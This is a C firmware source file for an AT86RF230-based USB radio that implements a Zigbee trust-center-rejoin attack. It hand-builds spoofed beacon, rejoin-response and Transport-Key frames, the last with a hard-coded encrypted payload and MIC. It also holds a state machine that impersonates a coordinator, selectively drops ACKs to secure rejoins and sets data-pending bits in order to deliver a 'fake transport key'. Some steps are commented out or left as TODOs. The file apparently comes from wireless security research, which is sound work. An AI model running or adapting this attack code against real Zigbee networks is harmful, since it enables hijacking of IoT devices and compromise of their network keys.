/*
 * fw/attacks/attack_12.c
 *
 * Written 2021 by Jincheng
 * Copyright 2021 Jincheng Wang
 *
 */

#include <stdbool.h>
#include <string.h>
#include <stdlib.h>

#define F_CPU 8000000UL
#include <util/delay.h>

#include "at86rf230.h"
#include "spi.h"
#include "board.h"
#include "attack.h"
#include <assert.h>



/********  Transciver Library ********/

/**
 * @brief  set_rx_aack: Set the required registers used for RX_AACK mode, then transfer the state to RX_AACK
 * @note   
 * @param  aack_config: Config used to set RX_AACK
 * @retval None
 */
void set_rx_aack(rx_aack_config* aack_config)
{
	// This function is mostly called when there is packets being sent. So first make sure that current packet has been sent out.
	while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_BUSY_TX_ARET);
	while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_TX_ARET_ON);
	// In order to reply an ACK automaticlly, we need to first transit to PLL_ON, then transit into RX_AACK state
	change_state(TRX_CMD_FORCE_PLL_ON);
	while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_PLL_ON);
	// Here we need to configure address for AACK, then transist into AACK mode
	reg_write(REG_SHORT_ADDR_0, aack_config->target_short_addr.addr_bytes[0]);
	reg_write(REG_SHORT_ADDR_1, aack_config->target_short_addr.addr_bytes[1]);
	reg_write(REG_PAN_ID_0, aack_config->target_pan_id.addr_bytes[0]);
	reg_write(REG_PAN_ID_1, aack_config->target_pan_id.addr_bytes[1]);

	// Set registers used by RX_AACK. Please refer to Page 55 in AT86RF231 spec.
	reg_write(0x0c, 0x00);
	reg_write(0x17, 0x02); // AACK_ACK_TIME: Send ACK quickly. Default value for 0x17: 0x00
	reg_write(0x2c, 0x38);
	if(!aack_config->dis_ack) {
		reg_write(0x2e, 0xc2);
	}
	else {
		reg_write(0x2e, 0xc2 | AACK_DIS_ACK);
	}
	if(aack_config->pending) {
		reg_write(0x2e, reg_read(0x2e) | AACK_SET_PD);
	}

	// Transist to RX_AACK_ON mode
	change_state(TRX_CMD_RX_AACK_ON);
	uint8_t reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;

	// Finally, make sure the state transition is right
	while(reg_status != TRX_CMD_RX_AACK_ON && reg_status != TRX_STATUS_BUSY_RX_AACK)
	{
		reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;
	}
}

/**
 * @brief  send_zbee_cmd: This is the framework for ATUSB to send packets
 * @note   
 * @param  layer:    	 Input: 1: MAC-Layer Command 2: NWK-Layer Command 3: APS-Layer Command
 * @param  command:  	 Input: The command ID which we want to send
 * @param  security: 	 Input: Security enable flags used in the frame
 * @param  dst_addr: 	 Input: dest addr information
 * @param  src_addr: 	 Input: src  addr information
 * @param  aack_config:  Input: user-defined aack_config
 * @retval None
 */
 
void send_zbee_cmd(uint8_t command, uint8_t security,
				   ieee802154_addr* dst_addr, ieee802154_addr* src_addr,
				   rx_aack_config* aack_config)
{
	// 1: Change Transciver state to TRX_CMD_FORCE_PLL_ON
	change_state(TRX_CMD_FORCE_PLL_ON);
	while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_PLL_ON);

	// 2: Send Packets
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);

	// Finally we applied hard-coded methods.
	switch (command) {
		case ZBEE_MAC_CMD_DATA_RQ :
			send_data_request(security, dst_addr, src_addr);
			break;
		case ZBEE_MAC_CMD_BEACON_RQ :
			send_beacon_request(security, dst_addr, src_addr);
			break;
		case ZBEE_MAC_CMD_BEACON_RP :
			send_beacon_response(security, dst_addr, src_addr);
			break;
		case ZBEE_NWK_CMD_REJOIN_RQ :
			send_rejoin_request(security, dst_addr, src_addr);
			break;
		case ZBEE_NWK_CMD_REJOIN_RP :
			send_rejoin_response(security, dst_addr, src_addr);
			break;
		case ZBEE_APS_CMD_KEY_TRANSPORT :
			send_transport_key(security, dst_addr, src_addr);
			break;
		default :
			break;
	}
	_delay_ms(2000);
	led(0);
	spi_end();
	
	// 3: Send the packet
	change_state(TRX_STATUS_TX_ARET_ON);
	slp_tr();
	// 4: Determine and configure the afterwards transciver mode
	if (aack_config->aack_flag)
	{
		set_rx_aack(aack_config);
	}
	else
	{
		// If RX_AACK is not needed, here we simply transform the state to PLL_ON
		change_state(TRX_CMD_PLL_ON);
	}
}

static uint8_t spi_send_blocks(void *data, uint8_t size)
{
	uint8_t count = 0 ;
	char* pdata = (char*)data;
	for(; count < size; count ++) {
		spi_send(*(pdata+count));
	}

	assert(count == size);
	return count;
}

/********  END of Transciver Library *******/

/********  Command Library *******/

// MAC Layer Command
void send_data_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	uint8_t count = 0;
	unsigned char length = 10 + 2;
	uint16_t FCF = 0x8863;
	unsigned char seqno = 0xff;
	const unsigned char cmd = 0x04;
	unsigned char contents[11] = {};

	count += spi_send_blocks(&length, sizeof(length));
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&dst_addr->pan, sizeof(dst_addr->pan));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
	count += spi_send_blocks(&cmd, sizeof(cmd));

	assert(count == length - 1);
}

void send_beacon_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	uint8_t count = 0;
	unsigned char length = 8 + 2;
	uint16_t FCF = 0x0803;		
	unsigned char seqno = 0xff;
	// For beacon request, the dst addr and dst pan id is 0xffff
	uint16_t const_dst_addr = 0xffff;
	unsigned char cmd = 0x07;

	count += spi_send_blocks(&length, sizeof(length));
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&const_dst_addr, sizeof(const_dst_addr));
	count += spi_send_blocks(&const_dst_addr, sizeof(const_dst_addr));
	count += spi_send_blocks(&cmd, sizeof(cmd));

	assert(count == length - 1);
}

void send_beacon_response(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	uint8_t count = 0;
	unsigned char length = 26 + 2;
	uint16_t FCF = 0x8000;		
	unsigned char seqno = 0xff;
	uint16_t super_frame = 0x4fff;
	uint8_t GTS = 0x00;
	uint8_t pending = 0x00;
	uint8_t proto = 0x00;
	uint16_t beacon_field = 0x8422;
	unsigned char offset[] = {0xff, 0xff, 0xff};
	uint8_t update_id = 0x01;

	count += spi_send_blocks(&length, sizeof(length));
	
	// MAC Layer
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&src_addr->pan, sizeof(src_addr->pan));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
	count += spi_send_blocks(&super_frame, sizeof(super_frame));

	// Beacon Payload
	count += spi_send_blocks(&GTS, sizeof(GTS));
	count += spi_send_blocks(&pending, sizeof(pending));
	count += spi_send_blocks(&proto, sizeof(proto));
	count += spi_send_blocks(&beacon_field, sizeof(beacon_field));
	count += spi_send_blocks(&src_addr->epan, sizeof(src_addr->epan));
	count += spi_send_blocks(offset, sizeof(offset));
	count += spi_send_blocks(&update_id, sizeof(update_id));

	assert(count == length - 1);
}

// NWK Layer Command
void send_rejoin_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	uint8_t count = 0;
	unsigned char length = 27 + 2;
	uint16_t FCF = 0x8861;		
	unsigned char seqno = 0xff;

	uint16_t NWK_FCF = 0x1009;
	uint8_t radius = 0x01;
	uint8_t nwk_seq = 0xff;

	uint8_t capability_info = 0x88;

	unsigned char cmd = 0x06;

	count += spi_send_blocks(&length, sizeof(length));

	// MAC Layer
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&dst_addr->pan, sizeof(dst_addr->pan));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));

	// NWK Layer
	count += spi_send_blocks(&NWK_FCF, sizeof(NWK_FCF));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
	count += spi_send_blocks(&radius, sizeof(radius));
	count += spi_send_blocks(&nwk_seq, sizeof(nwk_seq));
	count += spi_send_blocks(&src_addr->long_addr, sizeof(src_addr->long_addr));

	// NWK Payload
	count += spi_send_blocks(&cmd, sizeof(cmd));
	count += spi_send_blocks(&capability_info, sizeof(capability_info));

	assert(count == length - 1);

}

void send_rejoin_response(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	uint8_t count = 0;
	unsigned char length = 37 + 2;
	uint16_t FCF = 0x8861;		
	unsigned char seqno = 0xff;

	uint16_t NWK_FCF = 0x1809;
	uint8_t radius = 0x01;
	uint8_t nwk_seq = 0xff;
	uint8_t status = 0x00;

	unsigned char cmd = 0x07;

	count += spi_send_blocks(&length, sizeof(length));

	// MAC Layer
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&dst_addr->pan, sizeof(dst_addr->pan));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));

	// NWK Layer
	count += spi_send_blocks(&NWK_FCF, sizeof(NWK_FCF));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
	count += spi_send_blocks(&radius, sizeof(radius));
	count += spi_send_blocks(&nwk_seq, sizeof(nwk_seq));
	count += spi_send_blocks(&dst_addr->long_addr, sizeof(dst_addr->long_addr));
	count += spi_send_blocks(&src_addr->long_addr, sizeof(src_addr->long_addr));

	// NWK Payload
	count += spi_send_blocks(&cmd, sizeof(cmd));
	// TODO: Here we can replace the 16-bit address to assign a new address.
	// By default, we let assigned new address equal to ZED's previous addr
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&status, sizeof(status));

	assert(count == length - 1);

}

// APS Layer Command
void send_transport_key(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	assert(security == 1);
	uint8_t count = 0;
	unsigned char length = 71 + 2;
	uint16_t FCF = 0x8861;		
	unsigned char seqno = 0xff;

	uint16_t NWK_FCF = 0x0008;
	uint8_t radius = 0x1e;
	uint8_t nwk_seq = 0xff;

	uint8_t APS_FCF = 0x21;
	uint8_t counter = 0xff;

	uint8_t APS_SCF = 0x30;
	// TODO: Here we may need to replace the frame_counter
	uint32_t frame_counter = 0xaaaaaaaa;

	count += spi_send_blocks(&length, sizeof(length));
	// MAC Layer
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&dst_addr->pan, sizeof(dst_addr->pan));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));

	// NWK Layer
	count += spi_send_blocks(&NWK_FCF, sizeof(NWK_FCF));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
	count += spi_send_blocks(&radius, sizeof(radius));
	count += spi_send_blocks(&nwk_seq, sizeof(nwk_seq));

	// APS Layer
	count += spi_send_blocks(&APS_FCF, sizeof(APS_FCF));
	count += spi_send_blocks(&counter, sizeof(counter));

	// Aux Security Header
	count += spi_send_blocks(&APS_SCF, sizeof(APS_SCF));
	count += spi_send_blocks(&frame_counter, sizeof(frame_counter));
	count += spi_send_blocks(&src_addr->long_addr, sizeof(src_addr->long_addr));
	
	// TODO: Here we need to use encryption function in zigbee_crypt.c
	unsigned char encrypted_payload[] = {
		0x1f, 0xd0, 0x09, 0x1b, 0xb8, \
		0x1f, 0x19, 0x7d, 0x4e, 0x50, \
		0x1c, 0xea, 0x75, 0xc9, 0xe0, \
		0xd1, 0x88, 0x39, 0xc1, 0x3e, \
		0xda, 0x8f, 0x53, 0x6f, 0x14, \
		0x70, 0x60, 0x5a, 0xb1, 0xca, \
		0x0f, 0xda, 0x22, 0xd3, 0x0e \
	};
	unsigned char MIC[4] = {0xc6, 0xcd, 0xa7, 0xf6};

	count += spi_send_blocks(encrypted_payload, sizeof(encrypted_payload));
	count += spi_send_blocks(MIC, sizeof(MIC));
	assert(count == length - 1);
}

/********  END of Command Library *******/

/********  Detect-Specific Library *******/

/*
* @return:
*	0 if it is a beacon request
*	1 if it is an secure rejoin request
*	2 if it is an insecure rejoin request
*	3 if it is a data request
*/
uint8_t detect_packet_type(void)
{
	uint8_t phy_len = 0;

	uint8_t flag = 100;

	uint8_t fcf[2];

	uint8_t analyze_mac = 1;

	spi_begin();
	spi_io(AT86RF230_BUF_READ);
	// Analyze phy len
	phy_len = spi_recv();
	if (phy_len <= 7) {
		spi_end();
		return 0;
	}
	// Analyze MAC
	if (analyze_mac) {
		// Check MAC FCF
		_delay_us(32);
		fcf[0] = spi_recv();
		_delay_us(32);
		fcf[1] = spi_recv();
		if((fcf[0] == 0x03) && (fcf[1] == 0x08)) // Beacon Request
		{
			flag = 0;
		}
		else if ((fcf[0] == 0x61) && (fcf[1] == 0x88)) // NWK Rejoin Request
		{
			if (phy_len < 35) {
				flag = 2;  // Insecure Rejoin
			}
			else {
				flag = 1;
			}
		}
		else if ((fcf[0] == 0x63) && (fcf[1] == 0x88)) // Data Request
		{
			flag = 3;
		}
	}
	// We need to further judge whether the rejoin is a secure rejoin or not.
	spi_end();	
	return flag;
}

/********  END of Detect-Specific Library *******/

/********  Attack-Specific Functions *******/

/**
 * @brief  process_trust_center_rejoin contains process flow of trust center rejoin.
 * 1. Waiting for beacon request, and reply with beacon response.
 * 2. Waiting for Trust Center Rejoin Request and Data Request; Replying ACK with valid data pending flags.
 * 3. Replying Trust Center Rejoin Response.
 * 4. Waiting for Data Request; Replying Transport-Key Command.
 * 5. Replying all further messages with ACK
 * 
 * @param  *rejoin_response_flag: The flag used to mark current process of trust center rejoin.
 * 
 * @retval None
 */

void process_trust_center_rejoin(uint8_t *rejoin_response_flag)
{
	uint8_t flag = detect_packet_type();
	/*
	*
	* First, Replying ACK according to packet type.
	*
	*/
	if (flag == 0) // Beacon Request
	{
		// send_beacon_response();
		*rejoin_response_flag = 0;
	}
	else if (flag == 1) // Secure NWK Rejoin Request
	{
		// We don't want to reply to secure Rejoin Request
		// That is, we disable generation of ACK here. 0x2e default value: 0xc2
		reg_write(0x2e, 0xd2);
	}
	else if (flag == 2) // Insecure NWK Rejoin Request
	{
		// We reply with ACK
		reg_write(0x2e, 0xc2);
	}
	else if (flag == 3) // Data Request
	{
		// Set data pending bit. Default value: 0xc2
		reg_write(0x2e, 0xe2);
	}
	else // Unknown packet
	{

	}
	// <Wait for finishing sending ACK?>
	uint8_t reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;
	// Make sure the state transition is right
	while(reg_status != TRX_CMD_RX_AACK_ON)
	{
		reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;
	}

	// <ACK sending done?>
	if (flag == 3)
	{
		if (*rejoin_response_flag == 0) 
		{
			led(1);
			// send_rejoin_response(); // Send Response first
			*rejoin_response_flag = 1;
		}
		else if (*rejoin_response_flag == 1)
		{
			// send_transport_key1(); // Send fake transport key
			*rejoin_response_flag = 0;
		}
		
	}
}

void reconnaissance_attack(void)
{
 // TODO: Implement the attack
}
/********  END of Attack-Specific Library *******/